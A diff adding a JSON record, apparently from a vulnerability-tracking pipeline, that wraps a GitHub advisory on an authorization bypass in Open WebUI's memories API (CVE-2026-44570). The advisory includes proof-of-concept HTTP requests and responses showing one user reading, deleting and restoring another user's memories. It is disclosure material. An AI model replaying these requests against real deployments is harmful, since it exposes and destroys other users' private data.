@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [], \"cve_id\": \"CVE-2026-44570\", \"cvss\": {\"score\": 8.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.3, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-639\", \"name\": \"Authorization Bypass Through User-Controlled Key\"}], \"description\": \"### Summary\\n\\nAuthorization controls surrounding the memories API were inconsistent, resulting in the ability of a standard user to delete, restore, and view the contents of other users' memories.\\n\\n\\n### Details\\n\\nUsing a newly created non-admin user with no existing memories, it is possible to view existing memories via `POST /api/v1/memories/query`. See below under the PoC section, where a call to `GET /api/v1/memories/` returns `[]` (as expected) but a call to `POST /api/v1/memories/query` reveals memories created by other users.\\n\\nSimilarly, even if a non-admin user cannot modify another user's memory data via `POST /api/v1/memories/{memory_id}/update`, the endpoint's response improperly leaks the content of that memory if a valid memory_id is known.\\n\\nThe `DELETE /api/v1/memories/{memory_id}` can also be used by any user to delete an existing memory. Deleted memories can then be restored by calling the `POST /api/v1/memories/{memory_id}/update` endpoint again.\\n\\n### PoC 1\\n\\n**Example of a user with no memories able to query an existing memory from another user**\\n\\n```\\nGET /api/v1/memories/ HTTP/1.1\\nHost: localhost:8080\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\nAccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\nContent-Length: 0\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:19:58 GMT\\nserver: uvicorn\\ncontent-length: 2\\ncontent-type: application/json\\nx-process-time: 0\\n\\n[]\\n```\\n\\n```\\nPOST /api/v1/memories/query HTTP/1.1\\nHost: localhost:8080\\nContent-Length: 19\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\naccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\n\\n{\\n  \\\"content\\\": \\\"\\\"\\n}\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:22:01 GMT\\nserver: uvicorn\\ncontent-length: 187\\ncontent-type: application/json\\nx-process-time: 0\\naccess-control-allow-origin: *\\naccess-control-allow-credentials: true\\n\\n{\\\"ids\\\":[[\\\"d6802d76-a50f-4255-b68e-0f60c335e043\\\"]],\\\"documents\\\":[[\\\"My secret content\\\"]],\\\"metadatas\\\":[[{\\\"created_at\\\":1752784616,\\\"updated_at\\\":1752864797}]],\\\"distances\\\":[[0.6216812525921495]]}\\n```\\n\\n### PoC 2\\n\\n**Example showing excess output about a memory a user has no access to modify**\\n\\n```\\nPOST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1\\nHost: localhost:8080\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\nAccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\nContent-Length: 23\\n\\n{\\n  \\\"content\\\": \\\"\\\"\\n}\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 18:53:37 GMT\\nserver: uvicorn\\ncontent-length: 172\\ncontent-type: application/json\\nx-process-time: 0\\n\\n{\\\"id\\\":\\\"d6802d76-a50f-4255-b68e-0f60c335e043\\\",\\\"user_id\\\":\\\"a050e531-356b-4673-8772-ff1aecdf3273\\\",\\\"content\\\":\\\"My secret content\\\",\\\"updated_at\\\":1752864797,\\\"created_at\\\":1752784616}\\n```\\n\\n### PoC 3\\n\\n**Example showing a memory being deleted then restored by a different user than its owner**\\n\\n```\\nDELETE /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043 HTTP/1.1\\nHost: localhost:8080\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\naccept: application/json\\nConnection: keep-alive\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:31:19 GMT\\nserver: uvicorn\\ncontent-length: 4\\ncontent-type: application/json\\nx-process-time: 0\\n\\ntrue\\n```\\n\\n```\\nPOST /api/v1/memories/query HTTP/1.1\\nHost: localhost:8080\\nContent-Length: 19\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\naccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\n\\n{\\n  \\\"content\\\": \\\"\\\"\\n}\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:32:31 GMT\\nserver: uvicorn\\ncontent-length: 63\\ncontent-type: application/json\\nx-process-time: 0\\n\\n{\\\"ids\\\":[[]],\\\"documents\\\":[[]],\\\"metadatas\\\":[[]],\\\"distances\\\":[[]]}\\n```\\n\\n```\\nPOST /api/v1/memories/d6802d76-a50f-4255-b68e-0f60c335e043/update HTTP/1.1\\nHost: localhost:8080\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\nAccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\nContent-Length: 23\\n\\n{\\n  \\\"content\\\": \\\"\\\"\\n}\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:33:05 GMT\\nserver: uvicorn\\ncontent-length: 172\\ncontent-type: application/json\\nx-process-time: 0\\n\\n{\\\"id\\\":\\\"d6802d76-a50f-4255-b68e-0f60c335e043\\\",\\\"user_id\\\":\\\"a050e531-356b-4673-8772-ff1aecdf3273\\\",\\\"content\\\":\\\"My secret content\\\",\\\"updated_at\\\":1752864797,\\\"created_at\\\":1752784616}\\n```\\n\\n```\\nPOST /api/v1/memories/query HTTP/1.1\\nHost: localhost:8080\\nContent-Length: 19\\nAuthorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjUxYmI2MTZkLWI4MDktNDkwZi1hNDFmLTg5MWIwYmY0OGUyOCJ9.4W1ju8dp2LdiBbgD3q0RZ6r2Xf26ti0c-PQn7tWYXEE\\nUser-Agent: Test\\naccept: application/json\\nContent-Type: application/json\\nConnection: keep-alive\\n\\n{\\n  \\\"content\\\": \\\"\\\"\\n}\\n\\n---\\n\\nHTTP/1.1 200 OK\\ndate: Fri, 18 Jul 2025 19:33:34 GMT\\nserver: uvicorn\\ncontent-length: 187\\ncontent-type: application/json\\nx-process-time: 0\\n\\n{\\\"ids\\\":[[\\\"d6802d76-a50f-4255-b68e-0f60c335e043\\\"]],\\\"documents\\\":[[\\\"My secret content\\\"]],\\\"metadatas\\\":[[{\\\"created_at\\\":1752784616,\\\"updated_at\\\":1752864797}]],\\\"distances\\\":[[0.6216812525921495]]}\\n```\\n\\n### Impact\\n\\nPotential disclosure of sensitive data stored within a user's memories. Disclosure of unique user ID values to non-admins when viewing a memory.\", \"epss\": {\"percentage\": 0.00294, \"percentile\": 0.20869}, \"ghsa_id\": \"GHSA-hmjq-crxp-7rjw\", \"github_reviewed_at\": \"2026-05-11T14:25:49Z\", \"html_url\": \"https://github.com/advisories/GHSA-hmjq-crxp-7rjw\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-hmjq-crxp-7rjw\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44570\"}], \"nvd_published_at\": \"2026-05-15T22:16:53Z\", \"published_at\": \"2026-05-11T14:25:49Z\", \"references\": [\"https://github.com/open-webui/open-webui/security/advisories/GHSA-hmjq-crxp-7rjw\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44570\", \"https://github.com/advisories/GHSA-hmjq-crxp-7rjw\"], \"repository_advisory_url\": \"https://api.github.com/repos/open-webui/open-webui/security-advisories/GHSA-hmjq-crxp-7rjw\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/open-webui/open-webui\", \"summary\": \"Open WebUI has inconsistent authorization controls within memories API\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-19T15:57:48Z\", \"url\": \"https://api.github.com/advisories/GHSA-hmjq-crxp-7rjw\", \"vulnerabilities\": [{\"first_patched_version\": \"0.6.19\", \"package\": {\"ecosystem\": \"pip\", \"name\": \"open-webui\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 0.6.19\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-hmjq-crxp-7rjw",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "open-webui: < 0.6.19"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-44570"
+    ],
+    "cvss_score": 8.3,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "open-webui"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:01.755189Z",
+  "provenance": {
+    "content_sha256": "1c03b161e814b1b424a9370121f95a7f75470f1d2106cc09ed3107c0aecd17dc",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-11T14:25:49Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-hmjq-crxp-7rjw",
+  "status": "active",
+  "title": "Open WebUI has inconsistent authorization controls within memories API",
+  "updated_at": "2026-05-19T15:57:48Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-hmjq-crxp-7rjw"
+}
